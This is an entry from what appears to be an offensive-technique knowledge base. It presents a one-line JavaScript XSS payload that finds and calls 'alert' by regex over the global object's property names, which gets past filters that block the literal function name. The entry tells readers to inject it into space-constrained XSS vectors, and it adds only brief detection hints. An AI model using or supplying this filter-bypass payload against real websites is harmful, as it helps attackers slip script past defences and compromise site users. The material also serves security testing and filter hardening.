---
id: fd4fd99f-32ca-4586-85f3-bfa8fa2a6e7e
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.768451+00:00'
updated_at: '2023-04-10T20:21:46.075934+00:00'
tags:
  - xss
  - one-liner
  - obfuscation
platforms:
  - Web
  - Browser
validated: true
---

# One-Liner-Alert-Bypass-Using-Regex-Index

## Code

```javascript
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")
```

## Description

A compact version combining regex index finding and execution to invoke alert without direct reference.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| "1" | Alert argument | "1" |

## Usage

Inject as a single payload for space-constrained XSS vectors.

## Detection

- Compact loops with regex in single statements.
- Unusual self-referential executions.

## Related

- [[procedures/Bypass-XSS-Alert-Filter-Using-Alternate-Functions]]
